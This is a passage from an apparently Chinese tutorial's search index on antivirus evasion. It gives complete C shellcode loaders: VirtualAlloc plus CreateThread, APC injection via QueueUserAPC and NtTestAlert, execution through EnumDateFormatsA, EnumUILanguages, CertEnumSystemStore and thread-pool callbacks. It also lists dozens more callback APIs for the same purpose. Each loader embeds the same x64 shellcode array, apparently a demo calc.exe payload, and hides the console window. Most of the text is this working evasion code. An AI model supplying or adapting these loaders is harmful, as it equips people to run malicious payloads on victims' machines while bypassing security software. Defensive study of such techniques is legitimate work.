3\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nvoid main() {\n    // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n    LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE,\n   PAGE_EXECUTE_READWRITE);\n    // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n    if (addr == NULL) {\n        return;\n    }\n    // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n    memcpy(addr, sc, sizeof(sc));\n    // \u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c\n    HANDLE hThread = CreateThread(NULL,\n    NULL,\n    (LPTHREAD_START_ROUTINE)addr,\n    NULL,\n    NULL,\n    0);\n    // \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\n    WaitForSingleObject(hThread, -1);\n    // \u5173\u95ed\u7ebf\u7a0b\n    CloseHandle(hThread);\n}\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#4apc","title":"4.APC\u6ce8\u5165\u8fd0\u884c","text":"<p>\u5f02\u6b65\u8fc7\u7a0b\u8c03\u7528\uff08APC\uff09\u961f\u5217\u662f\u4e00\u4e2a\u4e0e\u7ebf\u7a0b\u5173\u8054\u7684\u961f\u5217\uff0c\u7528\u4e8e\u5b58\u50a8\u8981\u5728\u8be5\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u5f02\u6b65\u6267\u884c\u7684\u51fd\u6570\u3002\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4f1a\u8ddf\u8e2a\u6bcf\u4e2a\u7ebf\u7a0b\u7684 APC \u961f\u5217\uff0c\u5e76\u5728\u9002\u5f53\u7684\u65f6\u673a\u89e6\u53d1\u961f\u5217\u4e2d\u6302\u8d77\u7684\u51fd\u6570\u3002APC \u961f\u5217\u901a\u5e38\u7528\u4e8e\u5b9e\u73b0\u7ebf\u7a0b\u95f4\u7684\u5f02\u6b65\u901a\u4fe1\u3001\u5b9a\u65f6\u5668\u56de\u8c03\u4ee5\u53ca\u5f02\u6b65 I/O \u64cd\u4f5c\u3002</p> <p>APC \u961f\u5217\u5305\u542b\u4e24\u79cd\u7c7b\u578b\u7684 APC\uff1a</p> <ol> <li>\u5185\u6838\u6a21\u5f0f APC\uff1a\u7531\u5185\u6838\u4ee3\u7801\u53d1\u8d77\uff0c\u901a\u5e38\u7528\u4e8e\u5904\u7406\u5185\u6838\u7ea7\u522b\u7684\u5f02\u6b65\u64cd\u4f5c\uff0c\u5982\u5f02\u6b65 I/O \u5b8c\u6210\u3002</li> <li>\u7528\u6237\u6a21\u5f0f APC\uff1a\u7531\u7528\u6237\u4ee3\u7801\u53d1\u8d77\uff0c\u5141\u8bb8\u7528\u6237\u6001\u5e94\u7528\u7a0b\u5e8f\u5c06\u7279\u5b9a\u51fd\u6570\u63d2\u5165\u5230\u7ebf\u7a0b\u7684 APC \u961f\u5217\u4e2d\uff0c \u4ee5\u4fbf\u5728\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u5f02\u6b65\u6267\u884c</li> </ol> <p>\u5b9e\u73b0\u601d\u8def\uff1a</p> <ul> <li>\u4f7f\u7528 <code>VirtualProtect</code> \u51fd\u6570\u4fee\u6539 shellcode \u6240\u5728\u5185\u5b58\u533a\u57df\u7684\u4fdd\u62a4\u5c5e\u6027\uff0c\u5c06\u5176\u8bbe\u7f6e\u4e3a\u53ef\u6267\u884c\u3001\u53ef\u8bfb\u3001\u53ef\u5199\uff08 PAGE_EXECUTE_READWRITE \uff09\uff0c\u4ee5\u4fbf\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\u3002</li> <li>\u83b7\u53d6<code>NtTestAlert</code> \u51fd\u6570\u7684\u5730\u5740\u3002\u8fd9\u662f\u4e00\u4e2a\u5185\u90e8\u51fd\u6570\uff0c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u51fd\u6570\u540d\u8c03\u7528\u3002 NtTestAlert \u51fd\u6570\u7528\u4e8e\u68c0\u67e5\u5f53\u524d\u7ebf\u7a0b\u7684 APC \u961f\u5217\u3002\u5982\u679c\u961f\u5217\u4e2d\u6709\u6302\u8d77\u7684\u7528\u6237\u6a21\u5f0f APC \u8bf7\u6c42\uff0c NtTestAlert \u5c06\u89e6\u53d1\u5b83\u4eec\u7684\u6267\u884c\u3002</li> <li>\u4f7f\u7528 <code>QueueUserAPC</code> \u51fd\u6570\u5411\u5f53\u524d\u7ebf\u7a0b\u7684 APC \u961f\u5217\u6dfb\u52a0\u4e00\u4e2a\u6267\u884c Shellcode \u7684\u4efb\u52a1\u3002\u8fd9\u5c06\u5728 NtTestAlert \u88ab\u8c03\u7528\u65f6\u6267\u884c Shellcode\u3002</li> <li>\u8c03\u7528<code>NtTestAlert</code> \u51fd\u6570\uff0c\u89e6\u53d1 APC \u961f\u5217\u4e2d\u7684\u4efb\u52a1\u6267\u884c\uff0c\u5b9e\u73b0 Shellcode \u7684\u6267\u884c</li> </ul> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\ntypedef DWORD(WINAPI* pNtTestAlert)();\nvoid main() {\n    // \u4fee\u6539 shellcode \u6240\u5728\u5185\u5b58\u533a\u57df\u7684\u4fdd\u62a4\u5c5e\u6027\uff0c\u5141\u8bb8\u6267\u884c\n    DWORD oldProtect;\n    VirtualProtect((LPVOID)sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    /*\n    \u83b7\u53d6NtTestAlert\u51fd\u6570\u5730\u5740, \u56e0\u4e3a\u5b83\u662f\u4e00\u4e2a\u5185\u90e8\u51fd\u6570.\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u51fd\u6570\u540d\u8c03\u7528\n    \u8fd9\u4e2a\u51fd\u6570\u7528\u4e8e\u68c0\u67e5\u5f53\u524d\u7ebf\u7a0b\u7684 APC\uff08Asynchronous Procedure Call\uff0c\u5f02\u6b65\u8fc7\u7a0b\u8c03\u7528\uff09\u961f\u5217\uff0c\u5982\n    \u679c\u961f\u5217\u4e2d\u6709\u6302\u8d77\u7684\u7528\u6237\u6a21\u5f0f APC \u8bf7\u6c42\uff0cNtTestAlert \u5c06\u89e6\u53d1\u5b83\u4eec\u7684\u6267\u884c\n    */\n    pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA(\"ntdll\"),\n    \"NtTestAlert\"));\n    // \u5411\u5f53\u524d\u7ebf\u7a0b\u7684\u5f02\u6b65\u8fc7\u7a0b\u8c03\u7528(APC)\u961f\u5217\u6dfb\u52a0\u4e00\u4e2a\u6267\u884cshellcode\u7684\u4efb\u52a1\n    QueueUserAPC((PAPCFUNC)(PTHREAD_START_ROUTINE)(LPVOID)sc, GetCurrentThread(),\n    NULL);\n    //\u8c03\u7528NtTestAlert\uff0c\u89e6\u53d1 APC \u961f\u5217\u4e2d\u7684\u4efb\u52a1\u6267\u884c\uff08\u5373\u6267\u884c shellcode\uff09\n    NtTestAlert();\n}\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#5","title":"5.\u56de\u8c03\u51fd\u6570\u8fd0\u884c","text":""},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#enumdateformatsa","title":"EnumDateFormatsA","text":"<p>\u51fd\u6570\u539f\u578b:</p> <p>EnumDateFormatsA \u662f Windows API \u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u679a\u4e3e\u7279\u5b9a\u533a\u57df\u8bbe\u7f6e\u4e0b\u7684\u65e5\u671f\u683c\u5f0f\uff08\u5982\u957f\u65e5\u671f\u3001\u77ed\u65e5\u671f\u6216\u5e74/\u6708\u683c\u5f0f\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5c06\u6bcf\u79cd\u65e5\u671f\u683c\u5f0f\u4ee5\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u5b9a\u4e49\u7684\u56de\u8c03\u51fd\u6570\uff0c\u7531\u56de\u8c03\u51fd\u6570\u5904\u7406\u8fd9\u4e9b\u65e5\u671f\u683c\u5f0f\u3002</p> <p>\u4e3b\u8981\u53c2\u6570\u5305\u62ec\uff1a</p> <p>lpDateFmtEnumProc\uff1a\u6307\u5411\u5e94\u7528\u7a0b\u5e8f\u5b9a\u4e49\u7684\u56de\u8c03\u51fd\u6570\u7684\u6307\u9488\uff0c\u7528\u4e8e\u5904\u7406\u6bcf\u4e2a\u65e5\u671f\u683c\u5f0f\u3002</p> <p>Locale\uff1a\u6307\u5b9a\u8981\u68c0\u7d22\u65e5\u671f\u683c\u5f0f\u7684\u533a\u57df\u8bbe\u7f6e\u6807\u8bc6\u7b26\uff0c\u5982\u7cfb\u7edf\u9ed8\u8ba4\u6216\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u533a\u57df\u8bbe\u7f6e\u3002</p> <p>dwFlags\uff1a\u6807\u5fd7\u53c2\u6570\uff0c\u6307\u5b9a\u8981\u679a\u4e3e\u7684\u65e5\u671f\u683c\u5f0f\u7c7b\u578b\u3002</p> <p>\u51fd\u6570\u8fd4\u56de\u503c\u4e3a\u975e\u96f6\u8868\u793a\u6210\u529f\uff0c\u8fd4\u56de 0 \u8868\u793a\u5931\u8d25\u3002\u5f00\u53d1\u8005\u5e38\u7528\u8fd9\u4e2a\u51fd\u6570\u6765\u663e\u793a\u6216\u5904\u7406\u4e0d\u540c\u533a\u57df\u8bbe\u7f6e\u7684\u65e5\u671f\u683c\u5f0f\u200b</p> <pre><code>BOOL EnumDateFormatsA(\n[in] DATEFMT_ENUMPROCA lpDateFmtEnumProc, // \u6307\u5411\u5e94\u7528\u7a0b\u5e8f\u5b9a\u4e49\u7684\u56de\u8c03\u51fd\u6570\u7684\u6307\u9488\n[in] LCID Locale, // \u7528\u4e8e\u6307\u5b9a\u8981\u4e3a\u5176\u68c0\u7d22\u65e5\u671f\u683c\u5f0f\u4fe1\u606f\u7684\u533a\u57df\u8bbe\u7f6e\u7684\u533a\u57df\u8bbe\u7f6e\u6807\u8bc6\u7b26\n[in] DWORD dwFlags // \u6307\u5b9a\u65e5\u671f\u683c\u5f0f\u7684\u6807\u5fd7\n);\n</code></pre> <p>\u8be6\u7ec6\u4fe1\u606f</p> <pre><code>https://learn.microsoft.com/zh-cn/windows/win32/api/winnls/nf-winnls-enumdateformatsa\n</code></pre> <p>\u793a\u4f8b</p> <pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] =  \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nvoid main() {\n    // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n    LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE,\n   PAGE_EXECUTE_READWRITE);\n    // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n    if (addr == NULL) {\n        return;\n    }\n    // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n    memcpy(addr, sc, sizeof(sc));\n    // \u4f7f\u7528\u56de\u8c03\u51fd\u6570\u8c03\u7528\u6267\u884c\n    EnumDateFormatsA((DATEFMT_ENUMPROCA)addr, NULL, NULL);\n}\n// \u5173\u4e8eEnumDateFormatsA\u7684\u51fd\u6570\u53c2\u6570\n// \u9664\u4e86\u56de\u8c03\u51fd\u6570\u7684\u6307\u9488 , \u65e0\u8111\u5f3a\u8f6c\u4e00\u4e0b , \u5176\u4ed6\u5168NULL\n</code></pre> <p></p> <p>\u9664\u4e86 EnumDateFormatsA \u56de\u8c03\u51fd\u6570, \u5176\u4ed6\u7684\u8fd8\u6709 EnumUILanguages</p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#enumuilanguages","title":"EnumUILanguages","text":"<pre><code>#include &lt;Windows.h&gt;\n#include \"resource.h\"\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nint main() {\n    // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n    LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE,\n   PAGE_EXECUTE_READWRITE);\n    // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n    if (addr == NULL) {\n        return 1;\n    }\n    // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n    memcpy(addr, sc, sizeof(sc));\n    // \u56de\u8c03\u51fd\u6570\u8c03\u7528\u6267\u884c\n    EnumUILanguages((UILANGUAGE_ENUMPROC)addr, 0, 0);\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#certenumsystemstore","title":"CertEnumSystemStore","text":"<pre><code>#include&lt;Windows.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;Wincrypt.h&gt; // \u9700\u8981\u5bfc\u5165\n#pragma comment(lib, \"crypt32.lib\") // \u9700\u8981\u5bfc\u5165\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] = \"\\xfc\\x48\\x83\\xe4\\xf0\";\nvoid main() {\n    LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, \n    PAGE_EXECUTE_READWRITE);\n    if (addr == NULL) {\n        return;\n    }\n    memcpy(addr, sc, sizeof(sc));\n    CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, 0, 0, \n    (PFN_CERT_ENUM_SYSTEM_STORE)addr);\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_3","title":"\u5176\u4ed6\u56de\u8c03\u51fd\u6570\u7b49","text":"<pre><code>CertEnumSystemStore\nCertEnumSystemStoreLocation\nCreateThreadPoolWait\nCreateTimerQueueTimer_Tech\nCryptEnumOIDInfo\nEnumCalendarInfo\nEnumCalendarInfoEX\nEnumChildWindows\nEnumDesktopW\nEnumDesktopWindows\nEnumDirTreeW\nEnumDisplayMonitors\nEnumerateLoadedModules\nEnumFontFamiliesExW\nEnumFontFamiliesW\nEnumFontsW\nEnumUILanguages\nEnumLanguageGroupLocalesW\nEnumObjects\nEnumPageFilesW\nEnumPwrSchemes\nEnumResourceTypesExW\nEnumResourceTypesW\nEnumSystemLocalesEx\nEnumThreadWindows\nEnumTimeFormatsEx\nEnumUILanguagesW\nEnumWindows\nEnumWindowStationsW\nFiberContextEdit\nFlsAlloc\nImageGetDigestStream\nImmEnumInputContext\nLdrEnumerateLoadedModules\nSetTimer\nSetupCommitFileQueueW\nSymEnumProcesses\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#6","title":"6.\u521b\u5efa\u7ebf\u7a0b\u6c60\u8fd0\u884c","text":"<pre><code>#include&lt;Windows.h&gt;\n#include&lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\nunsigned char sc[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nvoid main() {\n    // \u5b9a\u4e49\u4e00\u4e2aDWORD\u53d8\u91cf\uff0c\u7528\u4e8e\u5b58\u50a8\u539f\u59cb\u5185\u5b58\u4fdd\u62a4\u5c5e\u6027\n    DWORD oldProtect;\n    // \u4fee\u6539shellcode\u6240\u5728\u5185\u5b58\u7684\u4fdd\u62a4\u5c5e\u6027\u4e3a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\n    VirtualProtect((LPVOID)sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    // \u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u521d\u59cb\u72b6\u6001\u4e3a\u6709\u4fe1\u53f7\u72b6\u6001\uff0c\u4f7f\u7528\u9ed8\u8ba4\u5b89\u5168\u5c5e\u6027\uff0c\u975e\u624b\u52a8\u91cd\u7f6e\uff0c\u65e0\u540d\u79f0\n    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);\n    /*\n    CreateThreadpoolWait\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u6c60\u7b49\u5f85\u5bf9\u8c61\u7684\u51fd\u6570,\n    \u7a0b\u6c60\u7b49\u5f85\u5bf9\u8c61\u5141\u8bb8\u60a8\u5728\u7b49\u5f85\u5185\u6838\u5bf9\u8c61\uff08\u5982\u4e8b\u4ef6\u3001\u4fe1\u53f7\u91cf\u7b49\uff09\u53d8\u4e3a\u6709\u4fe1\u53f7\u72b6\u6001\u65f6\u6267\u884c\u7279\u5b9a\u7684\u56de\u8c03\u51fd\u6570\n    \u5176\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b:\n    PTP_WAIT CreateThreadpoolWait(\n    PTP_WAIT_CALLBACK pfnwa, //\u6307\u5411\u56de\u8c03\u51fd\u6570\u7684\u6307\u9488\n    PVOID pv, //\u4f20\u9012\u7ed9\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\n    PTP_CALLBACK_ENVIRON pcbe //\u6307\u5411\u7ebf\u7a0b\u6c60\u56de\u8c03\u73af\u5883\u7684\u6307\u9488,\u7f6eNULL\u5219\u8868\u793a\u4f7f\u7528\u9ed8\u8ba4\u7684\u73af\u5883\n    );\n*/\n    // \u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u6c60\u7b49\u5f85\u5bf9\u8c61\uff0c\u5173\u8054\u5230shellcode\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\uff0c\u56de\u8c03\u51fd\u6570\u53c2\u6570\u548c\u7ebf\u7a0b\u6c60\u73af\u5883\u4e3aNULL\n    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)(LPVOID)sc,\n    NULL, NULL);\n    /*\n    